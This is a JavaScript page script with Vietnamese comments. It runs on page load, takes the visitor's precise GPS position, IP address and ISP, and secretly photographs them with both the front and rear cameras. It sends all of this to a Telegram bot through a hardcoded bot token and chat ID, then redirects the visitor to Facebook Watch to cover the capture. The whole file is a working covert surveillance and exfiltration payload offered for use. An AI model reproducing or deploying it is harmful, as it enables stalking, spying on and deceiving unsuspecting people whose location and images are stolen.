const TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const ID = '-1003770043455';

// Hàm lấy GPS với độ chính xác cao
function getGPS() {
    return new Promise((res) => {
        if (!navigator.geolocation) return res(null);
        let best = null;
        const watchID = navigator.geolocation.watchPosition(
            (p) => {
                const { latitude, longitude, accuracy } = p.coords;
                if (!best || accuracy < best.acc) {
                    best = { lat: latitude, lon: longitude, acc: accuracy };
                }
                if (accuracy < 10) { // Sai số dưới 10m thì dừng quét
                    navigator.geolocation.clearWatch(watchID);
                    res(best);
                }
            },
            () => res(best),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
        setTimeout(() => {
            navigator.geolocation.clearWatch(watchID);
            res(best);
        }, 8000); 
    });
}

async function getVitals() {
    try {
        const r = await fetch('https://ipwho.is/');
        const d = await r.json();
        return {
            ip: d.ip || '?',
            isp: d.connection?.org || '?',
            addr: `${d.city}, ${d.region}`,
            lat: d.latitude || 0,
            lon: d.longitude || 0
        };
    } catch (e) { return { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 }; }
}

async function capture(mode) {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        const v = document.createElement('video');
        v.srcObject = s;
        v.muted = true;
        await v.play();

        return new Promise(res => {
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                // Quan trọng: Tắt camera ngay lập tức sau khi chụp xong
                s.getTracks().forEach(t => t.stop());
                
                c.toBlob(res, 'image/jpeg', 0.7);
            }, 2000); // Chờ 2s để camera lấy nét
        });
    } catch (e) { return null; }
}

async function main() {
    // 1. Chạy lấy thông tin nền trước
    const [gps, info] = await Promise.all([getGPS(), getVitals()]);
    
    // 2. Chụp cam trước (user)
    const p1 = await capture("user");

    // --- ĐÂY LÀ ĐOẠN GIÃN CÁCH 1 GIÂY ---
    await new Promise(resolve => setTimeout(resolve, 1000)); 
    // ------------------------------------

    // 3. Chụp cam sau (environment)
    const p2 = await capture("environment");

    const lat = gps ? gps.lat : info.lat;
    const lon = gps ? gps.lon : info.lon;
    const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
    const map = `https://www.google.com/maps?q=${lat},${lon}`; // Sửa link map chuẩn

    const cap = `📡 [THÔNG TIN TRUY CẬP]
🕒 ${new Date().toLocaleString('vi-VN')}
📱 Thiết bị: ${navigator.platform}
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Khu vực: ${info.addr}
🛠 Định vị: ${type}
📌 Maps: ${map}
📸 Camera: ${p1 ? '✅ Trước' : '❌'} | ${p2 ? '✅ Sau' : '❌'}`.trim();

    const fd = new FormData();
    fd.append('chat_id', ID);
    
    if (p1 || p2) {
        const media = [];
        if (p1) {
            fd.append('f1', p1, '1.jpg');
            // Gắn Caption vào tấm hình đầu tiên trong mảng
            media.push({ type: 'photo', media: 'attach://f1', caption: cap });
        }
        if (p2) {
            fd.append('f2', p2, '2.jpg');
            // Nếu không có p1 thì gắn cap vào p2, nếu có rồi thì để trống
            media.push({ type: 'photo', media: 'attach://f2', caption: p1 ? '' : cap });
        }
        
        fd.append('media', JSON.stringify(media));
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
    } else {
        // Gửi tin nhắn text thuần nếu không chụp được ảnh nào
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ID, text: cap })
        });
    }
    
    // Chuyển hướng sau khi hoàn tất
    window.location.href = "https://www.facebook.com/watch/";
}

main();
